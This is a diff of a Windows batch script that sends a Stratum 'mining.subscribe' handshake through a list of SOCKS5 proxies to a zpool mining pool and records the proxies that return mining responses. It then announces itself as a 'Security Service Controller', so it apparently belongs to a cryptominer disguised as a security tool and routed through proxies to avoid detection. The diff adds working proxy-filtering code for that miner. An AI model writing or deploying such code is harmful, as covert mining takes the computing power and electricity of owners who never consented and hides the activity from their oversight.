@@ -99,26 +99,32 @@ for /f "usebackq delims=" %%P in ("%LIST%") do (
 if %COUNT% EQU 0 goto FAIL
 
 REM =========================
-REM TEST SOCKS5 -> STRATUM TCP
+REM STRATUM HANDSHAKE TEST
 REM =========================
-echo [INFO] Testing SOCKS5 STRATUM connectivity...
+echo [INFO] Testing SOCKS5 STRATUM proxies...
 > "%GOOD%" echo.
 
 for /f "usebackq delims=" %%P in ("%SOCKS%") do (
     set "P=%%P"
     set "P=!P:socks5://=!"
 
+    echo {"id":1,"method":"mining.subscribe","params":[]} | ^
     curl --silent ^
       --socks5-hostname !P! ^
-      --connect-timeout 1 ^
-      --max-time 1 ^
-      telnet://rinhash.sea.mine.zpool.ca:7444 >nul 2>&1
+      --connect-timeout 2 ^
+      --max-time 4 ^
+      --no-buffer ^
+      telnet://rinhash.sea.mine.zpool.ca:7444 > "%WORK%\resp.tmp" 2>nul
+
+    findstr /i "mining.notify mining.set_difficulty result" "%WORK%\resp.tmp" >nul
 
     if not errorlevel 1 (
         echo [OK] !P!
         echo !P!>>"%GOOD%"
     )
 )
+
+del "%WORK%\resp.tmp" >nul 2>&1
  
 echo ========================================
 echo   Security Service Controller STARTED
